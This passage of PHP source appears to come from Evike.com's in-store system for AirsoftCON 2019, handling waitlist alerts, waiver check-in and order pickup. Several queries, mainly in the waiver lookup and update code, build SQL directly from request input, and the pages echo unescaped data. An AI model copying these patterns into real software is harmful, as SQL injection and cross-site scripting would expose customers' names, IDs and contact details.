          $email_msg = "Thank you for waiting!\n\nWe are now serving wristband #s up to <b>" . (int)$newwaitlistnum . "</b> at the Evike.com AirsoftCON 2019 Superstore! Your wristband # is <b>" . $notifyinfo['wristband'] . "</b>, you can now come shop at the Superstore.\n\n";
          $email_msg .= "Already know what you want? You can <a href=\"https://www.evike.com/airsoftcon-sale/\">shop the same deals online</a> until 4pm, and check out with AirsoftCON Will Call. Your order will be prepared and can be picked up during AirsoftCON at the WILL CALL booth.\n\n";
          $email_msg .= "If you have any questions or need assistance, please talk to an Evike.com staff member.\n\n";
          $email_msg .= "Thank you and enjoy the event,\n\n";
          $email_msg .= "Evike.com AirsoftCON 2019 Staff\n\n";
          $htmlbody = str_replace( "\n", '<br/>', $email_msg );
          if ( sendhtmlemail( $notifyinfo['email'], $email_subject, $htmlbody, 'Evike.com AirsoftCON 2019', '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1d7372306f786d71645d786b747678337e7270">[email&#160;protected]</a>' ) ) { $emailsent = true; }
        }
        if ( $notifyinfo['phone'] != '' ) { if ( sendsms( $notifyinfo['phone'], "Now serving wristband #s up to " . (int)$newwaitlistnum . "! Your wristband # is " . $notifyinfo['wristband'] . ", you can now come shop at the Superstore. Thank you for waiting!" ) ) { $smssent = true; } }
      }
      $msg .= 'Customers notified between ' . $waitlistnum . ' and <b>' . (int)$newwaitlistnum . '</b>';
    }
    elseif ( (int)$newwaitlistnum > 0 ) { $msg = 'Already serving customers up to <b>' . $waitlistnum . '</b><br/>' . $newwaitlistnum . ' was entered which is invalid or already being served'; }
    else { $msg = 'Now serving customers up to <b>' . $waitlistnum . '</b>'; }
  ?>
     <div>
      <div class="completecontent">
       <form action="/store/index.php" method="post" id="queryform">
        <input type="hidden" name="action" value="waitlist" />
        <?php if ( $msg != '' ) { echo '<p class="message">' . $msg . '</p>'; } ?>
        <input type="tel" name="waitlistnum" value="" class="orderlookup" placeholder="Call Up To" autofocus="autofocus" onblur="this.value=this.value.replace(/[^0-9]/g,'');" />
        <button onclick="this.form.submit();">Notify Customers</button>
       </form>
      </div>
     </div>
  <?php
  }
  elseif ( $action == 'guestlist' ) {
    $listcontent = '';
    $guestquery = mysqli_query( $link, "SELECT * FROM waivers WHERE event='" . $event_code . "' AND checkin_count>0 ORDER BY CAST( wristband AS UNSIGNED ) DESC" );
    while( $guestinfo = mysqli_fetch_array( $guestquery ) ) {
      $listcontent .= '<tr><td style="text-align:left;">' . $guestinfo['signature_name'] . '</td><td style="text-align:left;">' . $guestinfo['parent_name'] . '</td><td style="text-align:center;">' . $guestinfo['wristband'] . '</td><td style="text-align:center;">' . $guestinfo['checkin_timestamp'] . '</td></tr>';
    }
    if ( $listcontent != '' ) {
      echo '<h1>' . $event_name . ' Checked-in Guests</h1>';
      $listcontent = '<tr><th style="text-align:left;">Name</th><th style="text-align:left;">Parent Name (if minor)</th><th style="text-align:center;">Wristband</th><th style="text-align:center;">Checkin</th></tr>' . $listcontent;
      #echo '<table style="width:100%;">' . $listcontent . '</table>';
      echo '<table>' . $listcontent . '</table>';
    }
  }
  elseif ( $action == 'event_pickup' ) {
    $orderid = $_REQUEST['orderid'];
    $search = $_REQUEST['search'];
    echo '<h1>' . $event_name . ' Order Lookup</h1>';
    if ( (int)$orderid > 0 ) {
      $orderquery = mysqli_query( $link, "SELECT o.*, os.orders_status_name FROM orders o LEFT JOIN orders_status os ON o.orders_status=os.orders_status_id WHERE o.orders_id='" . (int)$orderid . "'" );
      $orderinfo = mysqli_fetch_array( $orderquery );
      if ( $orderinfo['orders_id'] == (int)$orderid ) {
        $pickupcount = trim( $_REQUEST['pickupcount'] );
        if ( (int)$pickupcount > 0 ) {
          $orderproductsquery = mysqli_query( $link, "SELECT * FROM orders_products WHERE orders_id='" . (int)$orderid . "' AND products_id='" . $event_item . "'" );
          while ( $orderproductsinfo = mysqli_fetch_array( $orderproductsquery ) ) {
            if ( $orderproductsinfo['products_id'] == $event_item ) {
              $orderproductsupdatequery = mysqli_query( $link, "UPDATE orders_products SET products_shipped_quantity=products_quantity WHERE orders_products_id='" . $orderproductsinfo['orders_products_id'] . "'" );
              $ordernotesquery = mysqli_query( $link, "INSERT INTO orders_notes ( orders_id, admin_id, orders_notes ) VALUES ( '" . $orderinfo['orders_id'] . "', '0', '" . str_replace( "'", "''", $event_name ) . " event item picked up (x" . $pickupcount . ")' )" );
            }
          }
        }
        $sackcounter = array();
        $orderproductsquery = mysqli_query( $link, "SELECT * FROM orders_products WHERE orders_id='" . (int)$orderid . "' AND products_id='" . $event_item . "'" );
        while ( $orderproductsinfo = mysqli_fetch_array( $orderproductsquery ) ) {
          if ( $orderproductsinfo['products_id'] == $event_item ) {
            $sackcounter['ordered'] += $orderproductsinfo['products_quantity'];
            $sackcounter['pickedup'] += $orderproductsinfo['products_shipped_quantity'];
          }
        }
        $sackcounter['available'] = $sackcounter['ordered'] - $sackcounter['pickedup'];
        echo '<div class="completecontent"><div class="package">';
        echo '<h2>Order # ' . $orderinfo['orders_id'] . '</h2>';
        echo '<h3>Status: ' . $orderinfo['orders_status_name'] . '</h3>';
        echo '<h3>Customer Name: ' . $orderinfo['customers_name'] . '</h3>';
        echo '<h3>Customer Email: ' . $orderinfo['customers_email_address'] . '</h3>';
        if ( $orderinfo['billing_name'] != $orderinfo['customers_name'] ) { echo '<h3>Billing Name: ' . $orderinfo['billing_name'] . '</h3>'; }
        if ( $orderinfo['delivery_name'] != $orderinfo['customers_name'] && $orderinfo['delivery_name'] != $orderinfo['billing_name'] ) { echo '<h3>Shipping Name: ' . $orderinfo['delivery_name'] . '</h3>'; }
        if ( in_array( $orderinfo['orders_status'], array( 15, 20, 1, 48, 42, 16 ) ) ) { echo '<h4 style="margin-bottom:20px;">Order incomplete or cancelled</h4>'; }
        elseif ( $sackcounter['available'] > 0 ) {
          echo '<h4>Qty ' . $sackcounter['available'] . ' for pick up</h4>';
          if ( $sackcounter['pickedup'] > 0 ) { echo '<h3>(Qty ' . $sackcounter['ordered'] . ' ordered, ' . $sackcounter['pickedup'] . ' picked up)</h3>'; }
          echo '<form action="/store/index.php" method="post">';
          echo '<input type="hidden" name="action" value="event_pickup" />';
          echo '<input type="hidden" name="orderid" value="' . $orderinfo['orders_id'] . '" />';
          echo '<input type="hidden" name="pickupcount" value="' . $sackcounter['available'] . '" />';
          echo '<button style="padding:10px 15px;">Confirm Pickup</button>';
          echo '</form>';
        }
        elseif ( $sackcounter['pickedup'] > 0 ) { echo '<h4 style="margin-bottom:20px;">Qty ' . $sackcounter['pickedup'] . ' picked up</h4>'; }
        echo '</div></div>';
        echo '<div class="completecontent"><div class="package">';
        echo '<h3><strong>Waivers on File</strong></h3>';
        $waivercounter = 0;
        $waiverquery = mysqli_query( $link, "SELECT * FROM waivers WHERE event='" . $event_code . "' AND ( customers_id='" . $orderinfo['customers_id'] . "' OR email='" . $orderinfo['customers_email_address'] . "' )" );
        while ( $waiverinfo = mysqli_fetch_array( $waiverquery ) ) {
          echo '<h3>Releasor: <b>' . $waiverinfo['signature_name'] . '</b><br/>Signed Date: <b>' . $waiverinfo['signature_date'] . '</b>';
          if ( $waiverinfo['signature_id'] != '' ) { echo '<br/>ID: <b>' . $waiverinfo['signature_id'] . '</b>'; }
          if ( $waiverinfo['parent_name'] != '' ) {
            echo '<br/>Parent/Guardian: <b>' . $waiverinfo['parent_name'] . '</b><br/>Signed Date: <b>' . $waiverinfo['parent_date'] . '</b>';
            if ( $waiverinfo['parent_id'] != '' ) { echo '<br/>ID: <b>' . $waiverinfo['parent_id'] . '</b>'; }
          }
          echo '</h3>';
          $waivercounter++;
        }
        if ( $waivercounter == 0 ) { echo '<h3>No online waivers completed for this account/customer.</h3>'; }
        echo '</div></div>';
     }
      else { $msg = "Invalid order number."; }
    }
    elseif ( $search != '' && strlen( $search ) > 2 ) {
      $search = preg_replace( '/[^a-zA-Z ]/', '', $search );
      $resultcounter = 0;
      #$searchquery = mysqli_query( $link, "SELECT * FROM orders WHERE customers_name LIKE '%" . $search . "%' AND orders_id>=4106290 LIMIT 500" );
      $searchquery = mysqli_query( $link, "SELECT o.* FROM orders_products op LEFT JOIN orders o ON op.orders_id=o.orders_id WHERE op.products_id='" . $event_item . "' AND o.customers_name LIKE '%" . $search . "%' AND o.orders_id>=4106290 LIMIT 500" );
      while ( $orderinfo = mysqli_fetch_array( $searchquery ) ) {
        $sackcounter = array();
        $orderproductsquery = mysqli_query( $link, "SELECT * FROM orders_products WHERE orders_id='" . $orderinfo['orders_id'] . "' AND products_id='" . $event_item . "'" );
        while ( $orderproductsinfo = mysqli_fetch_array( $orderproductsquery ) ) {
          if ( $orderproductsinfo['products_id'] == $event_item ) {
            $sackcounter['ordered'] += $orderproductsinfo['products_quantity'];
            $sackcounter['pickedup'] += $orderproductsinfo['products_shipped_quantity'];
          }
        }
        $sackcounter['available'] = $sackcounter['ordered'] - $sackcounter['pickedup'];
        if ( $sackcounter['ordered'] > 0 ) {
          if ( $resultcounter <= 10 ) {
            $resultcontent .= '<div class="completecontent" style="float:left;margin:0 15px 15px 0;min-height:180px;border:2px solid #888;"><div class="package">';
            $resultcontent .= '<h2 style="margin-top:0;"><a href="/store/index.php?action=event_pickup&orderid=' . $orderinfo['orders_id'] . '">Order # ' . $orderinfo['orders_id'] . '</a></h2>';
            $resultcontent .= '<h3>Customer Name: ' . $orderinfo['customers_name'] . '</h3>';
            if ( $orderinfo['billing_name'] != $orderinfo['customers_name'] ) { $resultcontent .= '<h3>Billing Name: ' . $orderinfo['billing_name'] . '</h3>'; }
            if ( $orderinfo['delivery_name'] != $orderinfo['customers_name'] && $orderinfo['delivery_name'] != $orderinfo['billing_name'] ) { $resultcontent .= '<h3>Shipping Name: ' . $orderinfo['delivery_name'] . '</h3>'; }
            if ( in_array( $orderinfo['orders_status'], array( 15, 20, 1, 48, 42, 16 ) ) ) { $resultcontent .= '<h4 style="margin:10px;">Order incomplete or cancelled</h4>'; }
            elseif ( $sackcounter['available'] > 0 ) {
              $resultcontent .= '<h4 style="margin:10px;">Qty <b>' . $sackcounter['available'] . '</b> for pick up</h4>';
              if ( $sackcounter['pickedup'] > 0 ) { $resultcontent .= '<h3>(Qty ' . $sackcounter['ordered'] . ' ordered, ' . $sackcounter['pickedup'] . ' picked up)</h3>'; }
            }
            elseif ( $sackcounter['pickedup'] > 0 ) { $resultcontent .= '<h4 style="margin:10px;">Qty ' . $sackcounter['pickedup'] . ' picked up</h4>'; }
            $resultcontent .= '</div></div>';
          }
          $resultcounter++;
        }
      }
      if ( $resultcounter == 0 ) { echo '<div class="orderheader"><h2>No orders found for customer name search: <b>' . $search . '</b></h2></div>'; }
      else {
        echo '<div style="overflow:auto;">' . $resultcontent . '</div>';
        if ( $resultcounter > 10 ) { echo '<div class="orderheader"><h2>Additional orders were found but are not displayed. Please narrow down the search.</h2></div>'; }
      }
    }
    elseif ( $search != '' && strlen( $search ) <= 2 ) { echo '<div class="orderheader"><h2>Search query too short.</h2></div>'; }
  ?>
     <div>
      <div class="completecontent">
       <form action="/store/index.php" method="post" id="queryform">
        <input type="hidden" name="action" value="event_pickup" />
        <?php if ( $msg != '' ) { echo '<p class="message">' . $msg . '</p>'; } ?>
        <input type="tel" name="orderid" value="" class="orderlookup" id="orderfield" placeholder="Order number" autofocus="autofocus" onblur="this.value=this.value.replace(/[^0-9]/g,'');" />
        <input type="text" name="search" value="" class="orderlookup" id="search" placeholder="Search Name" onblur="this.value=this.value.replace(/[^a-zA-Z ]/g,'');" style="margin-top:10px;" />
        <button onclick="this.form.submit();">Look Up Order</button>
       </form>
      </div>
     </div>
  <?php
  }
  elseif ( $action == 'event_waiver' ) {
    $subaction = trim( $_REQUEST['subaction'] );
    $waiverid = trim( $_REQUEST['waiverid'] );
    $waivercode = trim( $_REQUEST['waivercode'] );
    $searchemail = trim( $_REQUEST['searchemail'] );
    $searchname = trim( $_REQUEST['searchname'] );
    $searchid = trim( $_REQUEST['searchid'] );
    echo '<h1>' . $event_name . ' Waiver Lookup</h1>';
    if ( $subaction == 'verify' && (int)$waiverid > 0 ) {
      $waiverwristband = trim( $_REQUEST['wristband'] );
      $signatureid = trim( $_REQUEST['signatureid'] );
      $waiveremail = trim( $_REQUEST['email'] );
      $waiverphone = trim( $_REQUEST['phone'] );
      $waiverquery = mysqli_query( $link, "SELECT * FROM waivers WHERE waivers_id='" . (int)$waiverid . "'" );
      $waiverinfo = mysqli_fetch_array( $waiverquery );
      if ( $waiverwristband != '' ) {
        $updatequery = mysqli_query( $link, "UPDATE waivers SET wristband='" . $waiverwristband . "', signature_id='" . $signatureid . "', email='" . $waiveremail . "', phone='" . $waiverphone . "' WHERE waivers_id='" . $waiverinfo['waivers_id'] . "'" );
        echo '<h3 style="color:green;"><b>Registration verified for ' . $waiverinfo['signature_name'] . ' with wristband ID ' . $waiverwristband . '.</b></h3>';
        if ( strtotime( "now" ) < strtotime( "2019-10-19 16:00:00" ) ) {
          if ( $waiveremail != '' ) {
            $email_subject = "Welcome to AirsoftCON 2019!";
            $email_msg = "Welcome to AirsoftCON 2019!\n\nYour wristband # is <b>" . $waiverwristband . "</b>.\n\nThis is also your raffle ticket number. Raffle starts at 2pm, announcement and entry begins at 1pm. You must be present to win. Good luck!\n\n";
            $email_msg .= "You'll be notified when it's your turn to shop at the Superstore.\n\nKnow what you want? Want to skip the line? You can <a href=\"https://www.evike.com/airsoftcon-sale/\">shop the same deals online</a> until 4pm, and check out with AirsoftCON Will Call. Your order will be prepared and can be picked up during AirsoftCON at the WILL CALL booth.\n\n";
            $email_msg .= "If you have any questions or need assistance, please talk to an Evike.com staff member.\n\n";
            $email_msg .= "Thank you and enjoy the event,\n\n";
            $email_msg .= "Evike.com AirsoftCON 2019 Staff\n\n";
            $htmlbody = str_replace( "\n", '<br/>', $email_msg );
            if ( sendhtmlemail( $waiveremail, $email_subject, $htmlbody, 'Evike.com AirsoftCON 2019', '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3d5352104f584d51447d584b545658135e5250">[email&#160;protected]</a>' ) ) { $emailsent = true; }
          }
          if ( $waiverphone != '' ) {
            if ( sendsms( $waiverphone, "Welcome to AirsoftCON 2019! Your wristband # is " . $waiverwristband . ". This is also your raffle ticket number. Raffle starts at 2pm, you must be present to win. Good luck!" ) ) { $smssent = true; }
            if ( sendsms( $waiverphone, "You'll be notified when it's your turn to shop at the Superstore. Want to skip the line? Shop the same deals online and check out with AirsoftCON Will Call." ) ) { $smssent = true; }
          }
        }
      }
    }
    if ( $waivercode != '' ) { $waiverlookup_query_raw = "SELECT * FROM waivers WHERE event='" . $event_code . "' AND waiver_code='" . $waivercode . "'"; }
    elseif ( $searchemail != '' && strlen( $searchemail ) >= 6 ) { $waiverlookup_query_raw = "SELECT * FROM waivers WHERE event='" . $event_code . "' AND email LIKE '%" . $searchemail . "%'"; }
    elseif ( $searchname != '' && strlen( $searchname ) >= 3 ) { $waiverlookup_query_raw = "SELECT * FROM waivers WHERE event='" . $event_code . "' AND ( signature_name LIKE '%" . $searchname . "%' OR parent_name LIKE '%" . $searchname . "%' )"; }
    elseif ( $searchid != '' && strlen( $searchid ) >= 3 ) { $waiverlookup_query_raw = "SELECT * FROM waivers WHERE event='" . $event_code . "' AND ( signature_id LIKE '%" . $searchid . "%' OR parent_id LIKE '%" . $searchid . "%' )"; }
    elseif ( $waivercode != '' || $searchemail != '' || $searchname != '' || $searchid != '' ) { $msg .= 'Search parameters too short or invalid, please try a different search.'; }
    if ( $waiverlookup_query_raw != '' ) {
      $waiverlookup_query_raw .= " LIMIT 20";
      echo '<div class="completecontent"><div class="package">';
      echo '<h3><strong>Waivers on File</strong></h3>';
      $waivercounter = 0;
      $waiverquery = mysqli_query( $link, $waiverlookup_query_raw );
      $numresults = mysqli_num_rows( $waiverquery );
      while ( $waiverinfo = mysqli_fetch_array( $waiverquery ) ) {
        #echo '<h3>Releasor: <b>' . $waiverinfo['signature_name'] . '</b><br/>Signed Date: <b>' . $waiverinfo['signature_date'] . '</b>';
        echo '<h3>Releasor: <b>' . $waiverinfo['signature_name'] . '</b><br/>Signed Date: <b>' . date( "m/d/y", strtotime( $waiverinfo['waiver_timestamp'] ) ) . '</b>';
        if ( $waiverinfo['signature_id'] != '' ) { echo '<br/>ID: <b>' . $waiverinfo['signature_id'] . '</b>'; }
        if ( $waiverinfo['email'] != '' ) { echo '<br/>Email: <b>' . $waiverinfo['email'] . '</b>'; }
        if ( $waiverinfo['phone'] != '' ) { echo '<br/>Phone: <b>' . $waiverinfo['phone'] . '</b> '; }
        if ( $waiverinfo['parent_name'] != '' ) {
          echo '<br/>Parent/Guardian: <b>' . $waiverinfo['parent_name'] . '</b><br/>Signed Date: <b>' . $waiverinfo['parent_date'] . '</b>';
          if ( $waiverinfo['parent_id'] != '' ) { echo '<br/>ID: <b>' . $waiverinfo['parent_id'] . '</b>'; }
        }
        if ( $numresults == 1 ) {
          $wristbandquery = mysqli_query( $link, "SELECT * FROM waivers WHERE event='" . $event_code . "' AND wristband!='' ORDER BY CAST( wristband AS UNSIGNED ) DESC LIMIT 1" );
          $wristbandinfo = mysqli_fetch_array( $wristbandquery );
          $wristband = (int)$wristbandinfo['wristband'] + 1;
          echo '</h3>';
          $checkinquery = mysqli_query( $link, "UPDATE waivers SET checkin_count=checkin_count+1, checkin_timestamp=NOW() WHERE waivers_id='" . $waiverinfo['waivers_id'] . "'" );
          echo '<h3 style="color:green;"><b>Checked In</b>';
          if ( $waiverinfo['checkin_count'] > 0 ) { echo ' (' . ( $waiverinfo['checkin_count'] + 1 ) . ' times)'; }
          echo '</h3>';
          echo '<form action="/store/index.php" method="post" style="margin:0;">';
          echo '<input type="hidden" name="action" value="event_waiver" />';
          echo '<input type="hidden" name="subaction" value="verify" />';
          echo '<input type="hidden" name="waiverid" value="' . $waiverinfo['waivers_id'] . '" />';
          echo '<h3>Wristband: <input type="tel" name="wristband" value="' . $wristband . '" class="orderlookup" required="required" /></h3>';
          echo '<h3>ID: <input type="text" name="signatureid" value="' . $waiverinfo['signature_id'] . '" class="orderlookup" required="required" /></h3>';
          echo '<h3>Email: <input type="text" name="email" value="' . $waiverinfo['email'] . '" class="orderlookup" required="required" /></h3>';
          echo '<h3>Phone: <input type="tel" name="phone" value="' . $waiverinfo['phone'] . '" class="orderlookup" placeholder="xxx-xxx-xxxx" pattern="[0-9]{3}-?[0-9]{3}-?[0-9]{4}" maxlength="15" /></h3>';
          echo '<button>VERFIY</button>';
          echo '</form>';
        }
        else {
          echo '<form action="/store/index.php" method="post" style="margin:0;">';
          echo '<input type="hidden" name="action" value="event_waiver" />';
          echo '<input type="hidden" name="waivercode" value="' . $waiverinfo['waiver_code'] . '" />';
          if ( $waiverinfo['checkin_count'] == 1 ) { echo '<b style="color:green;">Checked In</b><br/>'; }
          elseif ( $waiverinfo['checkin_count'] > 1 ) { echo '<b style="color:green;">Checked In</b> (' . $waiverinfo['checkin_count'] . ' times)<br/>'; }
          echo '<button style="margin:5px 0 25px;padding:6px 10px 4px;font-size:13px;">CHECK IN</button>';
          echo '</form>';
          echo '</h3>';
        }
        $waivercounter++;
      }
      if ( $waivercounter == 0 ) { echo '<h3 style="color:red;"><b>No online waivers found.</b></h3>'; }
      echo '</div></div>';
    }
  ?>
     <div>
      <div class="completecontent">
       <form action="/store/index.php" method="post" id="queryform">
        <input type="hidden" name="action" value="event_waiver" />
        <?php if ( $msg != '' ) { echo '<p class="message">' . $msg . '</p>'; } ?>
        <input type="tel" name="waivercode" value="" class="orderlookup" id="barcode" placeholder="Waiver Code" autofocus="autofocus" onblur="this.value=this.value.replace(/[^0-9]/g,'');" />
        <input type="email" name="searchemail" value="" class="orderlookup" id="email" placeholder="Email Address" style="margin-top:10px;" />
        <input type="text" name="searchname" value="" class="orderlookup" id="name" placeholder="Releasor/Parent Name" style="margin-top:10px;" />
        <input type="text" name="searchid" value="" class="orderlookup" id="id" placeholder="Releasor/Parent ID" style="margin-top:10px;" />
        <button onclick="this.form.submit();">Look Up Waiver</button>
       </form>
       <button onclick="window.location.href='<?php echo 'zxing://scan/?ret=https%3A%2F%2Fwww.evike.com%2Fstore%2Findex.php%3Faction%3Devent_waiver%26waivercode%3D%7BCODE%7D'; ?>';">Scan QR/Barcode</button>
      </div>
     </div>
  <?php
  }
  elseif ( $action == 'willcall_pickup' ) {
    $orderid = $_REQUEST['orderid'];
    $search = $_REQUEST['search'];
    echo '<h1>Will Call Order Lookup</h1>';
    if ( (int)$orderid > 0 ) {
      $orderquery = mysqli_query( $link, "SELECT o.*, os.orders_status_name FROM orders o LEFT JOIN orders_status os ON o.orders_status=os.orders_status_id WHERE o.orders_id='" . (int)$orderid . "'" );
      $orderinfo = mysqli_fetch_array( $orderquery );
      if ( $orderinfo['orders_id'] == (int)$orderid ) {
        $pickupconfirm = trim( $_REQUEST['pickupconfirm'] );
        if ( (int)$pickupconfirm == 1 ) {
          $orderproductsquery = mysqli_query( $link, "SELECT * FROM orders_products WHERE orders_id='" . (int)$orderid . "'" );
          while ( $orderproductsinfo = mysqli_fetch_array( $orderproductsquery ) ) {
            $orderproductsupdatequery = mysqli_query( $link, "UPDATE orders_products SET products_shipped_quantity=products_quantity WHERE orders_products_id='" . $orderproductsinfo['orders_products_id'] . "'" );
          }
          $ordernotesquery = mysqli_query( $link, "INSERT INTO orders_notes ( orders_id, admin_id, orders_notes ) VALUES ( '" . $orderinfo['orders_id'] . "', '0', 'Customer picked up order in store from " . $userinfo['pos_users_firstname'] . ' ' . $userinfo['pos_users_lastname'] . "' )" );
          $orderupdatequery = mysqli_query( $link, "UPDATE orders SET orders_status='36' WHERE orders_id='" . $orderinfo['orders_id'] . "'" );
          $orderstatusupdatequery = mysqli_query( $link, "INSERT INTO orders_status_history ( orders_id, orders_status_id, admin_id, date_added, customer_notified, comments ) VALUES ( '" . $orderinfo['orders_id'] . "', 36, 0, NOW(), 1, 'Order has been picked up in store' )" );
          $orderinfo['orders_status'] = 36;
        }
        echo '<div class="completecontent"><div class="package">';
        echo '<h2>Order # ' . $orderinfo['orders_id'] . '</h2>';
        echo '<h3>Status: ' . $orderinfo['orders_status_name'] . '</h3>';
        echo '<h3>Customer Name: ' . $orderinfo['customers_name'] . '</h3>';
        echo '<h3>Customer Email: ' . $orderinfo['customers_email_address'] . '</h3>';
        if ( $orderinfo['billing_name'] != $orderinfo['customers_name'] ) { echo '<h3>Billing Name: ' . $orderinfo['billing_name'] . '</h3>'; }
        if ( $orderinfo['delivery_name'] != $orderinfo['customers_name'] && $orderinfo['delivery_name'] != $orderinfo['billing_name'] ) { echo '<h3>Shipping Name: ' . $orderinfo['delivery_name'] . '</h3>'; }
        if ( $orderinfo['orders_shipmethod'] != 'In Store Pickup (Will Call)' ) { echo '<h4 style="margin-bottom:20px;color:red;">Order is not a will call order:<br/>' . $orderinfo['orders_shipmethod'] . '</h4>'; }
        elseif ( $orderinfo['payment_method'] == 'Pay in Store' ) { echo '<h4 style="margin-bottom:20px;color:red;">In-store order (No pick up)</h4>'; }
        elseif ( in_array( $orderinfo['orders_status'], array( 15, 20, 1, 48, 42, 16 ) ) ) { echo '<h4 style="margin-bottom:20px;color:red;">Order incomplete or cancelled</h4>'; }
        elseif ( in_array( $orderinfo['orders_status'], array( 5, 11 ) ) ) { echo '<h4 style="margin-bottom:20px;color:red;">Order has been shipped</h4>'; }
        elseif ( in_array( $orderinfo['orders_status'], array( 4, 8 ) ) ) { echo '<h4 style="margin-bottom:20px;color:orange;">Order contains backorder or preorders</h4>'; }
        elseif ( $orderinfo['orders_status'] == 36 && $pickupconfirm == 1 ) { echo '<h4 style="margin-bottom:20px;color:green;">Order has been successfully marked as picked up</h4>'; } # Order Complete
        elseif ( $orderinfo['orders_status'] == 36 ) { echo '<h4 style="margin-bottom:20px;color:red;">Order has been picked up</h4>'; } # Order Complete
        elseif ( $orderinfo['orders_status'] == 14 ) {
          echo '<h4 style="margin-bottom:20px;color:green;">Order ready for pick up</h4>';
          echo '</div></div>';
          echo '<div style="margin:0 auto;max-width:800px;width:100%;">';
          $customerquery = mysqli_query( $link, "SELECT * FROM customers WHERE customers_id='" . (int)$orderinfo['customers_id'] . "'" );
          $customerinfo = mysqli_fetch_array( $customerquery );
          if ( $customerinfo['customers_notes'] ) { echo '<h4 style="margin:0 0 5px;">Customer Notes:</h4><p style="margin:0 0 15px;color:red;">' . str_replace( "\n", '<br>', $customerinfo['customers_notes'] ) . '</p>'; }
          $ordernotescontent = "";
          $ordernotes_query = mysqli_query( $link, "SELECT n.orders_notes_id, n.orders_id, n.admin_id, a.admin_firstname, a.admin_lastname, n.orders_notes, n.orders_notes_created FROM orders_notes n LEFT JOIN admin a ON n.admin_id=a.admin_id WHERE n.orders_id='" . (int)$orderid . "' ORDER BY n.orders_notes_created" );
          while ( $ordernotes = mysqli_fetch_array( $ordernotes_query ) ) {
            $onotes = str_replace( "\n", "<br/>", $ordernotes['orders_notes'] );
            $onotes = str_replace( "\'", "'", $onotes );
            $onotes = str_replace( '\"', '"', $onotes );
            $onotes = str_replace( '\\\\', '\\', $onotes );
            $ordernotescontent .= '<tr>';
            $ordernotescontent .= '<td align="center" valign="top">';
            if ( $ordernotes['admin_firstname'] != '' || $ordernotes['admin_lastname'] ) { $ordernotescontent .= $ordernotes['admin_firstname'] . ' ' . $ordernotes['admin_lastname']; }
            elseif ( $ordernotes['admin_id'] > 0 ) { $ordernotescontent .= 'Admin ID ' . $ordernotes['admin_id']; }
            elseif ( preg_match( '/POS notes by ([\w\s]+):/', $onotes, $onotematches ) ) {
              $ordernotescontent .= $onotematches[1] . '<br/>(Store POS)';
              $onotes = preg_replace( '/POS notes by ' . $onotematches[1] . ':<br\/>/', '', $onotes );
            }
            elseif ( $ordernotes['pos_users_id'] > 0 ) {
              $user_query = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_id='" . (int)$ordernotes['pos_users_id'] . "'" );
              $user_data = mysqli_fetch_array( $user_query );
              $ordernotescontent .= $user_data['pos_users_firstname'] . ' ' . $user_data['pos_users_lastname'];
            }
            elseif ( $ordernotes['osp_users_id'] > 0 ) {
              $user_query = mysqli_query( $link, "SELECT * FROM pos_users WHERE osp_users_id='" . (int)$ordernotes['osp_users_id'] . "'" );
              $user_data = mysqli_fetch_array( $user_query );
              $ordernotescontent .= $user_data['osp_users_firstname'] . ' ' . $user_data['osp_users_lastname'];
            }
            else { $ordernotescontent .= 'Evike.com System'; }
            $ordernotescontent .= '</td>';
            $ordernotescontent .= '<td valign="top" style="overflow:hidden;text-overflow:ellipsis;">' . $onotes . '</td>';
            $ordernotescontent .= '<td align="center" valign="top">' . $ordernotes['orders_notes_created'] . '</td>';
            $ordernotescontent .= '</tr>';
          }
          if ( $ordernotescontent != "" ) {
            echo '<h4 style="margin:0 0 5px;">Order Notes:</h4>';
            echo '<table cellpadding="2" style="margin:0 0 15px;font:12px arial;table-layout:fixed;width:100%;">';
            echo '<tr><th style="width:140px;background:#ccc;">Rep</th><th style="min-width:250px;background:#ccc;">Notes</th><th style="width:250px;background:#ccc;">Date/Time</th></tr>';
            echo $ordernotescontent;
            echo '</table>';
          }
          $shipmentquery = mysqli_query( $link, "SELECT * FROM deposco_shipments WHERE orderNumber='" . (int)$orderid . "'" );
          $shipmentcount = mysqli_num_rows( $shipmentquery );
          if ( $shipmentcount > 1 ) { echo '<h4 style="margin:15px 0;color:red;">Note: Order picked in ' . $shipmentcount . ' batches, confirm order contents</h4>'; }
          $statusquery = mysqli_query( $link, "SELECT * FROM orders_status_history WHERE orders_id='" . (int)$orderid . "' AND comments='Order has been picked up in store'" );
          $statusdata = mysqli_fetch_array( $statusquery );
          if ( $statusdata['orders_status_history_id'] > 0 ) { echo '<h4 style="margin:15px 0;color:red;"><b>Warning</b>: Order showing previously picked up. Verify order with supervisor before confirming pickup.</h4>'; }
          echo '<table class="checkoutproducts">';
          echo '<tr><th>PID</th><th>Product</th><th>Quantity</th></tr>';
          $orderproductsquery = mysqli_query( $link, "SELECT op.*, pd.products_name FROM orders_products op LEFT JOIN products_description pd ON op.products_id=pd.products_id WHERE op.orders_id='" . (int)$orderid . "'" );
          while ( $orderproductsinfo = mysqli_fetch_array( $orderproductsquery ) ) {
            echo '<tr><td>' . $orderproductsinfo['products_id'] . '</td><td style="font-size:15px;">' . $orderproductsinfo['products_name'] . '</td><td>' . $orderproductsinfo['products_quantity'] . '</td></tr>';
          }
          echo '</table>';
          echo '</div>';
          echo '<div class="completecontent"><div class="package">';
          echo '<form action="/store/index.php" method="post">';
          echo '<input type="hidden" name="action" value="willcall_pickup" />';
          echo '<input type="hidden" name="orderid" value="' . $orderinfo['orders_id'] . '" />';
          echo '<input type="hidden" name="pickupconfirm" value="1" />';
          echo '<button style="padding:10px 15px;">Confirm Pickup</button>';
          echo '</form>';
        }
        else { echo '<h4 style="margin-bottom:20px;color:orange;">Not ready to pick up</h4>'; }
        echo '</div></div>';
      }
      else { $msg = "Invalid order number."; }
    }
    elseif ( $search != '' && strlen( $search ) > 2 ) {
      $search = preg_replace( '/[^a-zA-Z ]/', '', $search );
      $resultcounter = 0;
      $searchquery = mysqli_query( $link, "SELECT o.* FROM orders o WHERE o.orders_shipmethod='In Store Pickup (Will Call)' AND o.customers_name LIKE '%" . $search . "%' AND o.orders_id>=13000000 LIMIT 500" );
      while ( $orderinfo = mysqli_fetch_array( $searchquery ) ) {
        if ( $resultcounter <= 10 ) {
          $resultcontent .= '<div class="completecontent" style="float:left;margin:0 15px 15px 0;min-height:180px;border:2px solid #888;"><div class="package">';
